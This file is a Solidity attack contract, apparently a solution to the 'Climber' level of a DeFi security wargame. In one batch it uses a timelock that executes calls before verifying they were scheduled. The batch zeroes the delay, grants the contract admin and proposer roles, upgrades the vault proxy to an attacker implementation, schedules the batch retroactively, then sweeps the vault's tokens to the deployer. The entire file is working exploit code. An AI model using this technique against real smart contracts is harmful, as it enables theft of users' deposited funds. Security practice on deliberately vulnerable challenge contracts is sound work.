// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "./ClimberTimelock.sol";

import "hardhat/console.sol";

interface ITimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function updateDelay(uint64 newDelay) external;
}

interface IClimberVault {
    function sweepFunds(address tokenAddress) external;
}


/**
 * @title AttackClimber
 */
contract AttackClimber {
    using Address for address;

    address admin;
    address timelock;
    address upgradeable;
    address newImpl;

    bytes data;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor(address _timelock, address _upgradeable, address _newImplementation) {
        admin = msg.sender;
        timelock = _timelock;
        upgradeable = _upgradeable;
        newImpl = _newImplementation;
    }

    function attack(address tokenAddress) external {
        uint256 numItems = 6;
        address[] memory targets = new address[](numItems);
        targets[0] = timelock;
        targets[1] = timelock;
        targets[2] = timelock;
        targets[3] = upgradeable;
        targets[4] = upgradeable;
        targets[5] = address(this);


        uint256[] memory values = new uint256[](numItems);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        values[4] = 0;
        values[5] = 0;

        bytes[] memory dataElements = new bytes[](numItems);
        dataElements[0] = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );

        bytes32 proposerRole = keccak256("PROPOSER_ROLE");
        bytes32 adminRole = keccak256("ADMIN_ROLE");

        dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            adminRole,
            address(this)
        );
        dataElements[2] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            proposerRole,
            address(this)
        );
        dataElements[3] = abi.encodeWithSignature(
            "upgradeTo(address)",
            newImpl
        );
        dataElements[4] = abi.encodeWithSignature(
            "_setSweeper(address)",
            address(this)
        );
        dataElements[5] = abi.encodeWithSignature(
            "schedule()"
        );


        data = abi.encodeWithSignature(
            "schedule(address[],uint256[],bytes[],bytes32)",
            targets,
            values,
            dataElements,
            ""
        );

        bytes memory dataNow = abi.encodeWithSignature(
            "execute(address[],uint256[],bytes[],bytes32)",
            targets,
            values,
            dataElements,
            ""
        );

        timelock.functionCall(dataNow);
        IClimberVault(upgradeable).sweepFunds(tokenAddress);
        IERC20(tokenAddress).transfer(admin, IERC20(tokenAddress).balanceOf(address(this)));
    }

    function schedule() external {
        timelock.functionCall(data);
    }
}
